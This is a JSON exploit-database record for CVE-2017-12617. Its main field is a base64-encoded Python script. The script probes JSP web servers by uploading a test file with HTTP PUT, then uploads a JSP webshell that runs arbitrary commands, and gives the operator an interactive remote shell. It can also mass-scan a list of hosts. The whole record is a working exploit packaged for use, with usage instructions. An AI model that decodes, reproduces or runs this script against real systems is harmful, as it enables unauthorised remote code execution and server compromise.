{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9weXRob24NCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IHJlDQppbXBvcnQgc2lnbmFsDQpmcm9tIG9wdHBhcnNlIGltcG9ydCBPcHRpb25QYXJzZXINCg0KDQoNCg0KDQoNCg0KDQpjbGFzcyBiY29sb3JzOg0KICAgIEhFQURFUiA9ICdcMDMzWzk1bScNCiAgICBPS0JMVUUgPSAnXDAzM1s5NG0nDQogICAgT0tHUkVFTiA9ICdcMDMzWzkybScNCiAgICBXQVJOSU5HID0gJ1wwMzNbOTNtJw0KICAgIEZBSUwgPSAnXDAzM1s5MW0nDQogICAgRU5EQyA9ICdcMDMzWzBtJw0KICAgIEJPTEQgPSAnXDAzM1sxbScNCiAgICBVTkRFUkxJTkUgPSAnXDAzM1s0bScNCg0KDQoNCg0KYmFubmVyPSIiIg0KDQoNCiAgIF9fX19fX18gICAgICBfX19fX19fXyAgICBfX18gICBfX18gIF9fIF9fX19fXyAgICAgX18gX19fICAgX18gX18gX19fX19fIA0KICAvIF9fX19cIFwgICAgLyAvICBfX19ffCAgfF9fIFwgLyBfIFwvXyB8X19fXyAgfCAgIC9fIHxfXyBcIC8gLy9fIHxfX19fICB8DQogfCB8ICAgICBcIFwgIC8gL3wgfF9fIF9fX19fXyApIHwgfCB8IHx8IHwgICAvIC9fX19fX3wgfCAgKSAvIC9fIHwgfCAgIC8gLyANCiB8IHwgICAgICBcIFwvIC8gfCAgX198X19fX19fLyAvfCB8IHwgfHwgfCAgLyAvX19fX19ffCB8IC8gLyAnXyBcfCB8ICAvIC8gIA0KIHwgfF9fX18gICBcICAvICB8IHxfX19fICAgIC8gL198IHxffCB8fCB8IC8gLyAgICAgICB8IHwvIC98IChfKSB8IHwgLyAvICAgDQogIFxfX19fX3wgICBcLyAgIHxfX19fX198ICB8X19fX3xcX19fLyB8X3wvXy8gICAgICAgIHxffF9fX19cX19fL3xffC9fLyAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoNCltAaW50eDB4ODBdDQoNCiIiIg0KDQoNCg0KDQoNCmRlZiBzaWduYWxfaGFuZGxlcihzaWduYWwsIGZyYW1lKToNCg0KICAgIHByaW50ICgiXDAzM1s5MW0iKyJcblstXSBFeGl0aW5nIisiXDAzM1swbSIpDQoNCiAgICBleGl0KCkNCg0Kc2lnbmFsLnNpZ25hbChzaWduYWwuU0lHSU5ULCBzaWduYWxfaGFuZGxlcikNCg0KDQoNCg0KZGVmIHJlbW92ZXRhZ3ModGFncyk6DQogIHJlbW92ZSA9IHJlLmNvbXBpbGUoJzwuKj8+JykNCiAgdHh0ID0gcmUuc3ViKHJlbW92ZSwgJ1xuJywgdGFncykNCiAgcmV0dXJuIHR4dC5yZXBsYWNlKCJcblxuXG4iLCJcbiIpDQoNCg0KZGVmIGdldENvbnRlbnQodXJsLGYpOg0KICAgIGhlYWRlcnMgPSB7J1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTBfMSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzM5LjAuMjE3MS45NSBTYWZhcmkvNTM3LjM2J30NCiAgICByZT1yZXF1ZXN0cy5nZXQoc3RyKHVybCkrIi8iK3N0cihmKSwgaGVhZGVycz1oZWFkZXJzKQ0KICAgIHJldHVybiByZS5jb250ZW50DQoNCmRlZiBjcmVhdGVQYXlsb2FkKHVybCxmKToNCiAgICBldmlsPSc8JSBvdXQucHJpbnRsbigiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKTslPicNCiAgICBoZWFkZXJzID0geydVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzEwXzEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8zOS4wLjIxNzEuOTUgU2FmYXJpLzUzNy4zNid9DQogICAgcmVxPXJlcXVlc3RzLnB1dChzdHIodXJsKStzdHIoZikrIi8iLGRhdGE9ZXZpbCwgaGVhZGVycz1oZWFkZXJzKQ0KICAgIGlmIHJlcS5zdGF0dXNfY29kZT09MjAxOg0KICAgICAgICBwcmludCAiRmlsZSBDcmVhdGVkIC4uIg0KDQogICANCmRlZiBSQ0UodXJsLGYpOg0KICAgIEVWSUw9IiIiPEZPUk0gTUVUSE9EPUdFVCBBQ1RJT049J3t9Jz4iIiIuZm9ybWF0KGYpKyIiIg0KICAgIDxJTlBVVCBuYW1lPSdjbWQnIHR5cGU9dGV4dD4NCiAgICA8SU5QVVQgdHlwZT1zdWJtaXQgdmFsdWU9J1J1bic+DQogICAgPC9GT1JNPg0KICAgIDwlQCBwYWdlIGltcG9ydD0iamF2YS5pby4qIiAlPg0KICAgIDwlDQogICBTdHJpbmcgY21kID0gcmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpOw0KICAgU3RyaW5nIG91dHB1dCA9ICIiOw0KICAgaWYoY21kICE9IG51bGwpIHsNCiAgICAgIFN0cmluZyBzID0gbnVsbDsNCiAgICAgIHRyeSB7DQogICAgICAgICBQcm9jZXNzIHAgPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGNtZCxudWxsLG51bGwpOw0KICAgICAgICAgQnVmZmVyZWRSZWFkZXIgc0kgPSBuZXcgQnVmZmVyZWRSZWFkZXIobmV3DQpJbnB1dFN0cmVhbVJlYWRlcihwLmdldElucHV0U3RyZWFtKCkpKTsNCiAgICAgICAgIHdoaWxlKChzID0gc0kucmVhZExpbmUoKSkgIT0gbnVsbCkgeyBvdXRwdXQgKz0gcysiPC9icj4iOyB9DQogICAgICB9ICBjYXRjaChJT0V4Y2VwdGlvbiBlKSB7ICAgZS5wcmludFN0YWNrVHJhY2UoKTsgICB9DQogICB9DQolPg0KPHByZT48JT1vdXRwdXQgJT48L3ByZT4iIiINCg0KDQogICAgDQogICAgaGVhZGVycyA9IHsnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xMF8xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMzkuMC4yMTcxLjk1IFNhZmFyaS81MzcuMzYnfQ0KICAgIA0KICAgIHJlcT1yZXF1ZXN0cy5wdXQoc3RyKHVybCkrZisiLyIsZGF0YT1FVklMLCBoZWFkZXJzPWhlYWRlcnMpDQogICAgDQoNCg0KZGVmIHNoZWxsKHVybCxmKToNCiAgICANCiAgICB3aGlsZSBUcnVlOg0KICAgICAgICBoZWFkZXJzID0geydVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzEwXzEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8zOS4wLjIxNzEuOTUgU2FmYXJpLzUzNy4zNid9DQogICAgICAgIGNtZD1yYXdfaW5wdXQoIiQgIikNCiAgICAgICAgcGF5bG9hZD17J2NtZCc6Y21kfQ0KICAgICAgICBpZiBjbWQ9PSJxIiBvciBjbWQ9PSJRIjoNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICANCiAgICAgICAgcmU9cmVxdWVzdHMuZ2V0KHN0cih1cmwpKyIvIitzdHIoZikscGFyYW1zPXBheWxvYWQsaGVhZGVycz1oZWFkZXJzKQ0KICAgICAgICByZT1zdHIocmUuY29udGVudCkNCiAgICAgICAgdD1yZW1vdmV0YWdzKHJlKQ0KICAgICAgICBwcmludCB0DQoNCg0KDQoNCg0KI3ByaW50IGJjb2xvcnMuSEVBREVSKyBiYW5uZXIrYmNvbG9ycy5FTkRDDQoNCnBhcnNlPU9wdGlvblBhcnNlcigNCg0KDQpiY29sb3JzLkhFQURFUisiIiINCg0KDQogICBfX19fX19fICAgICAgX19fX19fX18gICAgX19fICAgX19fICBfXyBfX19fX18gICAgIF9fIF9fXyAgIF9fIF9fIF9fX19fXyANCiAgLyBfX19fXCBcICAgIC8gLyAgX19fX3wgIHxfXyBcIC8gXyBcL18gfF9fX18gIHwgICAvXyB8X18gXCAvIC8vXyB8X19fXyAgfA0KIHwgfCAgICAgXCBcICAvIC98IHxfXyBfX19fX18gKSB8IHwgfCB8fCB8ICAgLyAvX19fX198IHwgICkgLyAvXyB8IHwgICAvIC8gDQogfCB8ICAgICAgXCBcLyAvIHwgIF9ffF9fX19fXy8gL3wgfCB8IHx8IHwgIC8gL19fX19fX3wgfCAvIC8gJ18gXHwgfCAgLyAvICANCiB8IHxfX19fICAgXCAgLyAgfCB8X19fXyAgICAvIC9ffCB8X3wgfHwgfCAvIC8gICAgICAgfCB8LyAvfCAoXykgfCB8IC8gLyAgIA0KICBcX19fX198ICAgXC8gICB8X19fX19ffCAgfF9fX198XF9fXy8gfF98L18vICAgICAgICB8X3xfX19fXF9fXy98X3wvXy8gICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KDQoNCi4vY3ZlLTIwMTctMTI2MTcucHkgW29wdGlvbnNdDQoNCm9wdGlvbnM6DQoNCi11ICwtLXVybCBbOjpdIGNoZWNrIHRhcmdldCB1cmwgaWYgaXQncyB2dWxuZXJhYmxlIA0KLXAsLS1wd24gIFs6Ol0gZ2VuZXJhdGUgd2Vic2hlbGwgYW5kIHVwbG9hZCBpdA0KLWwsLS1saXN0IFs6Ol0gaG9zdHMgbGlzdA0KDQpbK111c2FnZToNCg0KLi9jdmUtMjAxNy0xMjYxNy5weSAtdSBodHRwOi8vMTI3LjAuMC4xDQouL2N2ZS0yMDE3LTEyNjE3LnB5IC0tdXJsIGh0dHA6Ly8xMjcuMC4wLjENCi4vY3ZlLTIwMTctMTI2MTcucHkgLXUgaHR0cDovLzEyNy4wLjAuMSAtcCBwd24NCi4vY3ZlLTIwMTctMTI2MTcucHkgLS11cmwgaHR0cDovLzEyNy4wLjAuMSAtcHduIHB3bg0KLi9jdmUtMjAxNy0xMjYxNy5weSAtbCBob3RzdHMudHh0DQouL2N2ZS0yMDE3LTEyNjE3LnB5IC0tbGlzdCBob3N0cy50eHQNCg0KDQpbQGludHgweDgwXQ0KDQoiIiIrYmNvbG9ycy5FTkRDDQoNCiAgICApDQoNCg0KcGFyc2UuYWRkX29wdGlvbigiLXUiLCItLXVybCIsZGVzdD0iVSIsdHlwZT0ic3RyaW5nIixoZWxwPSJXZWJzaXRlIFVybCIpICAgICAgICAgIA0KcGFyc2UuYWRkX29wdGlvbigiLXAiLCItLXB3biIsZGVzdD0iUCIsdHlwZT0ic3RyaW5nIixoZWxwPSJnZW5lcmF0ZSB3ZWJzaGVsbCBhbmQgdXBsb2FkIGl0IikNCnBhcnNlLmFkZF9vcHRpb24oIi1sIiwiLS1saXN0IixkZXN0PSJMIix0eXBlPSJzdHJpbmciLGhlbHA9Imhvc3RzIEZpbGUiKQ0KDQoob3B0LGFyZ3MpPXBhcnNlLnBhcnNlX2FyZ3MoKQ0KDQppZiBvcHQuVT09Tm9uZSBhbmQgb3B0LlA9PU5vbmUgYW5kIG9wdC5MPT1Ob25lOg0KICAgIHByaW50KHBhcnNlLnVzYWdlKQ0KICAgIGV4aXQoMCkNCg0KDQoNCmVsc2U6DQogICAgaWYgb3B0LlUhPU5vbmUgYW5kIG9wdC5QPT1Ob25lIGFuZCBvcHQuTD09Tm9uZToNCiAgICAgICAgcHJpbnQgYmNvbG9ycy5PS0dSRUVOK2Jhbm5lcitiY29sb3JzLkVOREMgDQogICAgCXVybD1zdHIob3B0LlUpDQogICAgCWNoZWNrZXI9IlBvYy5qc3AiDQogICAgCXByaW50IGJjb2xvcnMuQk9MRCArIlBvYyBGaWxlbmFtZSAge30iLmZvcm1hdChjaGVja2VyKQ0KICAgIAljcmVhdGVQYXlsb2FkKHN0cih1cmwpKyIvIixjaGVja2VyKQ0KICAgIAljb249Z2V0Q29udGVudChzdHIodXJsKSsiLyIsY2hlY2tlcikNCiAgICAJaWYgJ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBJyBpbiBjb246DQogICAgCQlwcmludCBiY29sb3JzLldBUk5JTkcrdXJsKycgaXRcJ3MgVnVsbmVyYWJsZSB0byBDVkUtMjAxNy0xMjYxNycrYmNvbG9ycy5FTkRDDQoJCXByaW50IGJjb2xvcnMuV0FSTklORyt1cmwrIi8iK2NoZWNrZXIrYmNvbG9ycy5FTkRDDQoJCQ0KCWVsc2U6DQogICAgICAgICAgICBwcmludCAnTm90IFZ1bG5lcmFibGUgdG8gQ1ZFLTIwMTctMTI2MTcgJw0KICAgIGVsaWYgb3B0LlAhPU5vbmUgYW5kIG9wdC5VIT1Ob25lIGFuZCAgb3B0Lkw9PU5vbmU6DQogICAgICAgICAgICAgICAgcHJpbnQgYmNvbG9ycy5PS0dSRUVOK2Jhbm5lcitiY29sb3JzLkVOREMgDQoJCXB3bj1zdHIob3B0LlApDQoJCXVybD1zdHIob3B0LlUpDQoJCXByaW50ICJVcGxvYWRpbmcgV2Vic2hlbGwgLi4uLi4iDQoJCXB3bj1wd24rIi5qc3AiDQoJCVJDRShzdHIodXJsKSsiLyIscHduKQ0KCQlzaGVsbChzdHIodXJsKSxwd24pDQogICAgZWxpZiBvcHQuTCE9Tm9uZSBhbmQgb3B0LlA9PU5vbmUgYW5kIG9wdC5VPT1Ob25lOg0KICAgICAgICAgICAgICAgIHByaW50IGJjb2xvcnMuT0tHUkVFTitiYW5uZXIrYmNvbG9ycy5FTkRDIA0KCQl3PXN0cihvcHQuTCkNCgkJZj1vcGVuKHcsInIiKQ0KCQlwcmludCAiU2NhbmluZyBob3N0cyBpbiB7fSIuZm9ybWF0KHcpDQoJCWNoZWNrZXI9IlBvYy5qc3AiDQoJCWZvciBpIGluIGYucmVhZGxpbmVzKCk6DQoJCQlpPWkuc3RyaXAoIlxuIikNCgkJCWNyZWF0ZVBheWxvYWQoc3RyKGkpKyIvIixjaGVja2VyKQ0KCQkJY29uPWdldENvbnRlbnQoc3RyKGkpKyIvIixjaGVja2VyKQ0KCQkJaWYgJ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBJyBpbiBjb246DQoJCQkJcHJpbnQgc3RyKGkpKyJcMDMzWzkxbSIrIiBbIFZ1bG5lcmFibGUgXSAiIlwwMzNbMG0iDQo=", 
    "filename": "platforms/jsp/webapps/42966.py", 
    "id": "42966", 
    "cves": [
        "CVE-2017-12617"
    ]
}